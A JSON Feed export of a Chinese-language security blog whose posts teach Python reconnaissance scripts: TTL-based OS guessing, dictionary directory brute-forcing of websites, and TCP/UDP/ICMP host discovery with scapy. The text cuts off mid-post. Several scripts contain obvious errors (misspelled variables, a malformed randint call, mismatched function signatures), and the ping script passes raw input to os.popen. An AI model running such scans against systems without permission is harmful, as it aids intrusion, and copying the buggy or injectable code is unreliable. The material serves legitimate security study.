{
    "version": "https://jsonfeed.org/version/1",
    "title": "低头学习  抬头看路",
    "subtitle": "很多人已经做到了，而他们都曾经和现在的你站在同样的起点上",
    "icon": "https://nnnpc.github.io/images/favicon.ico",
    "description": "欢迎来交流学习",
    "home_page_url": "https://nnnpc.github.io",
    "items": [
        {
            "id": "https://nnnpc.github.io/2024/04/16/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%94%E2%80%94%E7%B3%BB%E7%BB%9F%E8%AF%86%E5%88%AB/",
            "url": "https://nnnpc.github.io/2024/04/16/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%94%E2%80%94%E7%B3%BB%E7%BB%9F%E8%AF%86%E5%88%AB/",
            "title": "主动信息收集------系统识别",
            "date_published": "2024-04-16T05:58:19.074Z",
            "content_html": "<blockquote>\n<p>识别出目标主机操作系统的类型和版本，可以大量减少不必要的测试版本，缩小测试范围，更精确地针对目标进行渗透测试<br />\n但是判断目标地操作系统并非一件简单的事情。因为现在的操作系统类型繁多，仅 Windows 和 Linux 就包含了许多衍生系统，同时，现今的防火墙、路由器、智能设备等都有其自带的操作系统，所以需要精确判断目标操作系统的类型并非易事。目前主要通过 &quot;指纹识别&quot; 的方式来对目标的操作系统来进行猜测。检测方法一般分为两种：主动式探测和被动式探测。<br />\n主动式探测：向目标主机发送一段特定的数据包，根据目标主机对数据包做出的回应进行分析，判断目标主机中可能的操作系统类型。和被动探测比起来，主动的方式肯定更为准确，但也同时因为是直接对目标主机进行发送而更容易触发目标安全系统的警报</p>\n</blockquote>\n<p>被动式探测：通过工具嗅探、记录、分析数据包流。根据数据包信息来分析目标主机的操作系统。与主动探测相比，被动探测的结果虽然可能没有那么精确，但是不容易被目标主机的安全系统察觉</p>\n<p>主机识别的原理：Windows 操作系统与 Linux 的操作系统的 TCP/IP 实现方式并不一样，导致对特定格式数据包的回应也不相同，包括响应数据中的内容、响应时间等，就形成了操作系统的指纹。通常的情况下，可以对主机进行 ping 之后根据返回的 TTL 值来判断系统类型</p>\n<p>Windows TTL 起始值：128</p>\n<p>Linux TTL 起始值：64</p>\n<p>每经过一条路由，TTL 值 - 1</p>\n<p>这里就不做界面演示了，可以直接去找 Windows 和 Linux 的机子去 ping 一下看看 TTL 值</p>\n<p>接下来就使用返回 TTL 值的原理来用 python 程序实现自动化探测主机系统类型</p>\n<p>导入程序代码所应用的模块：optparse、os 和 re。optparse 用于生成命令行参数；os 用于执行系统命令；re 为正则表达式模块，用于匹配返回的 TTL 值</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from optparse import OptionParser</span><br><span class=\"line\">import os</span><br><span class=\"line\">import re</span><br></pre></td></tr></table></figure></p>\n<p>利用 optparse 模块生成命令行参数化形式，对用户输入的参数进行接收和批量处理，最后将处理后的 IP 地址传入 ttl_scan () 函数</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def main():</span><br><span class=\"line\">    parser = OptionParser(&quot;Usage:%prog -i &lt;target host&gt;&quot;) #输出帮助信息</span><br><span class=\"line\">    parser.add_option(&#x27;-i&#x27;,type=&#x27;string&#x27;,dest=&#x27;IP&#x27;,help=&#x27;specify target host&#x27;)</span><br><span class=\"line\">    #获取IP地址参数</span><br><span class=\"line\">    options,args = parser.parse_args()</span><br><span class=\"line\">    ip = options.IP</span><br><span class=\"line\">    ttl_scan(ip)</span><br><span class=\"line\">    </span><br><span class=\"line\">if __name__ == &quot;__main__&quot;:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure></p>\n<p>调用 os.popen () 函数执行 ping 命令，并将返回的结果通过正则表达式识别，提取出 TTL 值。当 TTL 值小于等于 64 时，操作系统为 Linux 类型，输出 &quot;xx.xx.xx.xx<br />\nis Linux/UNIX&quot;，否则输出&quot;xx.xx.xx.xx is Windows&quot;。</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def ttl_scan(ip):</span><br><span class=\"line\">    ttlstrmatch = re.compile(r&#x27;ttl=\\d+&#x27;)</span><br><span class=\"line\">    ttlnummatch = re.compile(r&#x27;\\d+&#x27;)</span><br><span class=\"line\">    result = os.popen(&quot;ping -c 1 &quot; + ip)</span><br><span class=\"line\">    res = result.read()</span><br><span class=\"line\">    for line in res.splitlines():</span><br><span class=\"line\">        result = ttlstrmatch.findall(line)</span><br><span class=\"line\">        if result:</span><br><span class=\"line\">            ttl = ttlnummatch.findall(line)</span><br><span class=\"line\">            if int(ttl[0]) &lt;= 64:  # 判断目标主机响应包中TTL值是否小于等于64</span><br><span class=\"line\">                print(&quot;%s is Linux/UNIX&quot; % ip)  # TTL&lt;=64时为Linux/UNIX系统</span><br><span class=\"line\">            else:</span><br><span class=\"line\">                print(&quot;%s is Windows&quot; % ip)  # 反之则为Windows系统</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            pass</span><br></pre></td></tr></table></figure></p>\n<p>一个简易的检测脚本就完成了，使用方法：</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 ./host.py -i IP</span><br></pre></td></tr></table></figure></p>\n<p>一般来说，主动的主机系统类型探测就是向目标主机发送特定数据包，然后用目标主机的回应包中的数据与指纹库来进行对比，从而得出主机系统类型，这里的脚本化简了这一流程。直接通过 ping 和返回的 TTL 值来对主机系统类型进行一个判断</p>\n",
            "tags": [
                "python",
                "python"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%94%E2%80%94%E6%95%8F%E6%84%9F%E7%9B%AE%E5%BD%95%E6%8E%A2%E6%B5%8B/",
            "url": "https://nnnpc.github.io/2024/04/16/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%94%E2%80%94%E6%95%8F%E6%84%9F%E7%9B%AE%E5%BD%95%E6%8E%A2%E6%B5%8B/",
            "title": "主动信息收集------敏感目录探测",
            "date_published": "2024-04-16T05:58:19.071Z",
            "content_html": "<blockquote>\n<p>资源发现属于信息收集的一部分，善于发现隐藏信息，如隐藏目录、隐藏文件等，可提高渗透测试的全面细致性。接下来就用 Python 实现敏感目录的发现。在渗透测试过程中，资源发现是极其重要的一环。具备好的资源发现能力能够令整个工作事半功倍。<br />\n在渗透测试过程中进行目录扫描是很有必要的，例如，当发现开发过程中未关闭或者忘记关闭的页面，可能就会发现许多可以利用的信息，接下来编写一个基于字典的目录扫描脚本<br />\n要进行网页的目录扫描，就需要进行网页访问，所以先导入 requests 模块备用，然后等待用户输入 url 和字典</p>\n</blockquote>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">headers = &#123;</span><br><span class=\"line\">    &quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0) Gecko/20100101 Firefox/6.0&quot;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">url = input(&quot;url:&quot;)</span><br><span class=\"line\">txt = input(&#x27;php.txt&#x27;)</span><br></pre></td></tr></table></figure></p>\n<p>当用户没有输入字典时，默认打开根目录的 php.txt，然后将字典中的内容放进队列中：</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">url_list = []</span><br><span class=\"line\">if txt == &quot;&quot;:</span><br><span class=\"line\">    txt = &quot;php.txt&quot;</span><br><span class=\"line\">try:</span><br><span class=\"line\">    with open(txt,&#x27;r&#x27;) as f:</span><br><span class=\"line\">        for a in f:</span><br><span class=\"line\">            a = a.replace(&#x27;\\n&#x27;,&#x27;&#x27;)</span><br><span class=\"line\">            url_list.append(a)</span><br><span class=\"line\">        f.close()</span><br><span class=\"line\">except:</span><br><span class=\"line\">    print(&quot;error!&quot;)</span><br></pre></td></tr></table></figure></p>\n<p>将队列中的内容拼接到 url 中组成需要验证的地址，通过返回值来判断是否存在此目录</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">for li in url_list:</span><br><span class=\"line\">    conn = &quot;http://&quot; + url + &quot;&quot; +li</span><br><span class=\"line\"></span><br><span class=\"line\">    try:</span><br><span class=\"line\">        response = requests.get(conn,headers = headers)</span><br><span class=\"line\">        print(&quot;%s---------------%s&quot; % (conn,response))</span><br><span class=\"line\">    except error.HTTPError as e:</span><br><span class=\"line\">        print(&#x27;%s---------------%s&#x27; %(conn,e.code))</span><br><span class=\"line\">    except error.URLError :</span><br><span class=\"line\">         print(&quot;域名访问失败！&quot;)</span><br><span class=\"line\">         exit(1)</span><br></pre></td></tr></table></figure></p>\n<p>原理比较简单，可以理解为用字典进行的暴力破解，就是通过需要请求的 url 和字典中的可能存在泄露的目录进行拼接以后挨个访问，用返回的状态码来显示目录是否存在</p>\n",
            "tags": [
                "python",
                "python"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%94%E2%80%94%E5%9F%BA%E4%BA%8ETCP%E3%80%81UDP%E7%9A%84%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0/",
            "url": "https://nnnpc.github.io/2024/04/16/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%94%E2%80%94%E5%9F%BA%E4%BA%8ETCP%E3%80%81UDP%E7%9A%84%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0/",
            "title": "主动信息收集------基于TCP、UDP的主机发现",
            "date_published": "2024-04-16T05:58:19.070Z",
            "content_html": "<blockquote>\n<p>基于 TCP、UDP 的主机发现属于四层主机发现，是一个位于传输层的协议。可以用来探测远程主机存活、端口开放、服务类型以及系统类型等信息，相比于三层主机发现更为可靠，用途更广<br />\n<strong> TCP</strong> 是一种面向连接的、可靠的传输通信协议，位于 IP 层之上，应用层之下的中间层。它每一次建立连接都需要经过三次握手，终止一次连接也需要四次挥手（四次握手），建立完成之后才能进行传输数据。详解：</p>\n</blockquote>\n<p><a href=\"https://nnnpc.github.io/2022/11/18/%E5%85%B3%E4%BA%8ETCP%E4%B8%8EUDP%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%AD%A6%E4%B9%A0/\">https://nnnpc.github.io/2022/11/18 / 关于 TCP 与 UDP 协议的学习 /</a><br />\nTCP 建立的连接可以有效防止丢包和服务器一直在最后的确认状态导致无法关闭的情况发生，因此 TCP 是一个可靠的传输协议</p>\n<p>我们可以利用 TCP 的三次握手来进行主机存活的探测。有两种方法：</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.向目标主机直接发送ACK数据包，如果目标主机存活，就会返回一RST数据包来终止这个不正常的TCP连接</span><br><span class=\"line\">2.发送正常的SYN数据包，如果目标主机返回SYN/ACK或者RST包，也可以证明主机为存活状态</span><br></pre></td></tr></table></figure></p>\n<p>工作原理主要依据响应数据包中 flags 字段，如果该字段有值则说明主机存活，该字段通常包括 SYN、FIN、ACK、PSH、RST、URG 六种类型。发送 SYN 包表示是建立连接，而发送 FIN 包表示的是关闭连接，ACK 是应答，PSH 表示包含 data 数据传输，RST 表示连接重置，URG 表示紧急指针<br />\n知道了原理和方法之后就可以来编写脚本了，这里还是使用 scapy 库来完成，先进行一个小测试</p>\n<p>首先导入应该用的模块</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from telnetlib import IP</span><br><span class=\"line\">from scapy.all import *</span><br><span class=\"line\">from scapy.layers.inet import TCP</span><br></pre></td></tr></table></figure></p>\n<p>接着用 a.display () 函数来查看目标主机的返回数据包信息</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ip = IP()</span><br><span class=\"line\">tcp = TCP()</span><br><span class=\"line\">r = (ip/tcp)</span><br><span class=\"line\">r[IP].dst = &quot;（需要判断的主机IP）&quot;</span><br><span class=\"line\">r[TCP].flags = &quot;A&quot;</span><br><span class=\"line\">a = sr1(r)</span><br><span class=\"line\">a.display()</span><br></pre></td></tr></table></figure></p>\n<p>结果为：<br />\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/8xwGKAgwr0dyAmsj.png!thumbnail\" alt=\"\" title=\"fig:\" /></p>\n<p>可以明显的看到返回值为返回数据包的标志位为 R，证明主机存活，表示远程主机给源主机发送了一个 REST</p>\n<p>根据以上 TCP 发现主机存活的测试，就可以编写相应的工具来探测主机存活了</p>\n<p>先导入程序代码所应用到的模块：time、optparse、random 和 scapy。time 模块主要用于产生延迟时间，optparse 用于生成命令行参数，random 模块用于生成随机的端口，scapy 用于以 TCP 发送请求以及接受应答数据</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import time</span><br><span class=\"line\">from optparse import OptionParser</span><br><span class=\"line\">from random import randint</span><br><span class=\"line\">from scapy.all import *</span><br></pre></td></tr></table></figure></p>\n<p>接着利用 optparse 模块生成命令行参数化形式，对用户输入的参数进行接收和批量处理，最后将处理后的 IP 地址传入 Scan () 函数</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def main():</span><br><span class=\"line\">    usage = &quot;Usage:%prog -i &lt;ip address&gt;&quot;   #输出帮助信息</span><br><span class=\"line\">    parse = OptionParser(usage=usage)</span><br><span class=\"line\">    parse.add_option(&quot;-i&quot;,&#x27;--ip&#x27;,type=&quot;string&quot;,dest=&quot;targetIP&quot;,help=&quot;specify the IP address&quot;)</span><br><span class=\"line\">    options,args = parse.parse_args()</span><br><span class=\"line\">    if &#x27;-&#x27; in options.targetIP:</span><br><span class=\"line\">        for i in range(int(options.tagetIP.split(&#x27;-&#x27;)[0].split(&#x27;-&#x27;)[3]), int(options.targetIP.split(&#x27;-&#x27;)[1]) + 1):</span><br><span class=\"line\">            Scan(</span><br><span class=\"line\">                options.targetIP.split(&#x27;.&#x27;)[0] + &#x27;.&#x27; + options.targetIP.split(&#x27;.&#x27;)[1] + &#x27;.&#x27; + options.targetIP.split(&#x27;.&#x27;)[2] + &#x27;.&#x27; + str(</span><br><span class=\"line\">                    i)</span><br><span class=\"line\">            )</span><br><span class=\"line\">            time.sleep(0.2)</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        Scan(options.targetIP)</span><br><span class=\"line\">      </span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure></p>\n<p>Scan () 函数，通过调用 TCP 将构造好的请求包发送到目的地址，并且根据目标主机返回的数据包中的 flags 字段值判断主机是否存活。若 flags 字段为 R，其整性数值为 4 时表示接收到了目标主机的 REST，目标主机为存活状态</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def Scan():</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        dport = random.randint(1.65535)</span><br><span class=\"line\">        packeet = IP(dst=ip)/TCP(flags=&quot;A&quot;,dport=dport)</span><br><span class=\"line\">        response = sr1(packet,timeout=11.0,verbose=0)</span><br><span class=\"line\">        if response:</span><br><span class=\"line\">            if int(response[TCP].flags) == 4:</span><br><span class=\"line\">                time.sleep(0.5)</span><br><span class=\"line\">                print(ip + &#x27; &#x27;+&quot;is up&quot;)</span><br><span class=\"line\">            else:</span><br><span class=\"line\">                print(ip + &#x27; &#x27;+&quot;is down&quot;)</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            print(ip + &#x27;&#x27; + &quot;is down&quot;)</span><br><span class=\"line\">    except:</span><br><span class=\"line\">        pass</span><br></pre></td></tr></table></figure></p>\n<p><strong>UDP</strong> 是一种利用 IP 提供提供面向无连接的网络通信服务。UDP 会把应用程序发来的数据，在收到的一刻立即原样发送到网络上。即使在网络传输过程中出现丢包、顺序错乱等情况时，UDP 也不会负责重新发送以及纠错。当向目标发送一个 UDP 数据包之后，目标是不会发回任何 UDP 数据包的。但是如果目标主机处于活跃状态并且目标端口关闭，则会返回一个 ICMP 数据包，这个数据包的含义为 unreachable。如果目标主机不处于活跃状态，这是是收不到任何响应数据的。利用这个原理可以实现探测存活主机</p>\n<p>现在来利用该原理浅浅编写一个程序测试一下，同样利用 scapy 库来完成，首先先导入需要用到的库</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from telnetlib import IP</span><br><span class=\"line\">from scapy.all import *</span><br><span class=\"line\">from scapy.layers.inet import UDP</span><br></pre></td></tr></table></figure></p>\n<p>接着利用 UDP 协议来判断主机是否存活</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ip = IP()</span><br><span class=\"line\">udp = UDP()</span><br><span class=\"line\">r = (ip/udp)</span><br><span class=\"line\">r[IP].dst = &quot;（需要判断的主机IP）&quot;</span><br><span class=\"line\">r[UDP].dport = 7345</span><br><span class=\"line\">a = sr1(r)</span><br><span class=\"line\">a.display()</span><br></pre></td></tr></table></figure></p>\n<p>如果目标主机存活，就会接收到目标主机的应答信息。看到返回信息中存在 ICMP 的应答信息，&quot;code=port-unreachable&quot; 表示目标端口不可达，这样就可以验证远程主机存活了，如果不存活则不会收到目标机子的响应数据包<br />\n接下来就可以根据测试结果和原理来编写相应的 python 工具了</p>\n<p>首先需要导入需要用到的模块：time、optparse、random 和 scapy</p>\n<blockquote>\n<p>time：用于产生延迟时间<br />\n optparse：用于生成命令行参数<br />\n random：用于生成随机的端口<br />\n scapy：用于以 UDP 发送请求以及接收应答数据</p>\n</blockquote>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import time</span><br><span class=\"line\">from optparse import OptionParser</span><br><span class=\"line\">from random import randint</span><br><span class=\"line\">from scapy.all import *</span><br><span class=\"line\">from telnetlib import IP</span><br><span class=\"line\">from scapy.layers.inet import UDP</span><br></pre></td></tr></table></figure></p>\n<p>接着利用 optparse 模块生成命令行参数化形式，对用户输入的参数进行批量接收和处理，并将结果传入 Scan () 函数</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def main():</span><br><span class=\"line\">    usage = &quot;Usage:%prog -i &lt;ip address&gt;&quot;  # 输出帮助信息</span><br><span class=\"line\">    parse = OptionParser(usage=usage)</span><br><span class=\"line\">    parse.add_option(&quot;-i&quot;, &#x27;--ip&#x27;, type=&quot;string&quot;, dest=&quot;targetIP&quot;, help=&quot;specify the IP address&quot;)</span><br><span class=\"line\">    options, args = parse.parse_args()</span><br><span class=\"line\">    if &#x27;-&#x27; in options.targetIP:</span><br><span class=\"line\">        for i in range(int(options.tagetIP.split(&#x27;-&#x27;)[0].split(&#x27;-&#x27;)[3]), int(options.targetIP.split(&#x27;-&#x27;)[1]) + 1):</span><br><span class=\"line\">            Scan(</span><br><span class=\"line\">                options.targetIP.split(&#x27;.&#x27;)[0] + &#x27;.&#x27; + options.targetIP.split(&#x27;.&#x27;)[1] + &#x27;.&#x27; +</span><br><span class=\"line\">                options.targetIP.split(&#x27;.&#x27;)[2] + &#x27;.&#x27; + str(</span><br><span class=\"line\">                    i)</span><br><span class=\"line\">            )</span><br><span class=\"line\">            time.sleep(0.2)</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        Scan(options.targetIP)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure></p>\n<p>main () 函数中的内容与利用 TCP 协议判断存活主机的 main () 中的内容一样，不同之处在 Scan 函数的协议与判断方式<br />\n通过调用 UDP 将构造好的包发送到目标地址，并根据是否接收到目标的响应包来判断目标机子是否存活，当 proto 字段为 1 时则判断为存活状态，否则不存活</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def Scan(ip):</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        dport = random.randint(1,65535)</span><br><span class=\"line\">        packet = IP(dst=ip)/UDP(dport=dport)</span><br><span class=\"line\">        response = sr1(packet,timeout=1.0,verbose=0)</span><br><span class=\"line\">        if response:</span><br><span class=\"line\">            if int(response[IP].proto) == 1:</span><br><span class=\"line\">                time.sleep(0.5)</span><br><span class=\"line\">                print(ip + &#x27; &#x27; + &quot;is up&quot;)</span><br><span class=\"line\">            else:</span><br><span class=\"line\">                print(ip + &#x27; &#x27; + &quot;is down&quot;)</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            print(ip + &#x27; &#x27; + &quot;is down&quot;)</span><br><span class=\"line\">    except:</span><br><span class=\"line\">        pass</span><br></pre></td></tr></table></figure></p>\n<p>同时也可以使用 nmap 库利用 TCP 和 UDP 协议来进行探测，修改 Scan () 函数中的代码即可（调用函数来使用相应的参数）</p>\n",
            "tags": [
                "python",
                "python"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%94%E2%80%94%E5%9F%BA%E4%BA%8EICMP%E7%9A%84%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0/",
            "url": "https://nnnpc.github.io/2024/04/16/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%94%E2%80%94%E5%9F%BA%E4%BA%8EICMP%E7%9A%84%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0/",
            "title": "主动信息收集------基于ICMP的主机发现",
            "date_published": "2024-04-16T05:58:19.068Z",
            "content_html": "<blockquote>\n<p>ICMP(Internet Control Message<br />\nProtocol，Internet 报文协议) 是 TCP/IP 的一种子协议，位于 OSI7 层网络模型中的网络层，其目的是用于在 IP 主机、路由器之前传递控制信息<br />\n OS17 层网络模型</p>\n</blockquote>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/PTXM2FQSmK1RmU69.png!thumbnail\" alt=\"\" /></p>\n<blockquote>\n<p>图片来自<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20veXVuamlzdWFuY2hlbmd6aGFuZ2x1L3AvMTY1MDIzMDcuaHRtbA==\"> https://www.cnblogs.com/yunjisuanchengzhanglu/p/16502307.html</span></p>\n</blockquote>\n<p><strong>ICMP 工作流程</strong></p>\n<p>ICMP 中提供了多种报文，这些报文又可以分成两大类：&quot;差错通知&quot; 和 &quot;信息查询&quot;</p>\n<p><strong>差错通知</strong></p>\n<p>当 IP 数据包在对方计算机处理过程中出现未知的发送错误时，ICMP 会向发送者传送错误事实以及错误原因等，示意图如下</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/rANoIf2yrmzE72fY.png!thumbnail\" alt=\"\" /></p>\n<p><strong>信息查询</strong></p>\n<p>信息查询由一个请求和一个应答构成的。只需要向目标发送一个请求数据包，如果收到了来自目标的回应，就可以判断目标是活跃主机，否则可以判断目标是非活跃主机，示意图如下</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/NaMzEdM0TcqGBqgt.png!thumbnail\" alt=\"\" /></p>\n<p><strong>ICMP 主机探测过程</strong></p>\n<p>Ping 命令是 ICMP 中较为常见的一种应用，经常使用这个命令来测试本地与目标之前的连通性，发送一个 ICMP 请求消息给目标主机，若源主机收到目标主机的应答响应消息，则表示目标可达，主机存在。例如想要判断某一台主机是否为存活主机，那么 ping 一下该主机，查看有无回应即可判断是否存活</p>\n<p>现在来编写一个利用 ICMP 实现探测活跃主机的代码程序。程序有很多种可实现的方法，这里借助 Scapy 库来完成。它是 python 中的一个第三方库，在 Scapy 库中已经实现了大量的网络协议。如 TCP、UDP、IP、ARP 等，使用该库可以灵活编写各种网络工具。</p>\n<p>首先安装 Scapy</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pip install scapy</span><br></pre></td></tr></table></figure></p>\n<p>接下来就可以进行实现了<br />\n 1. 导入程序代码所应用到的模块：scapy、random、optparse，其中 scapy 用于发送 ping 请求和接受目标主机的应答数据</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td 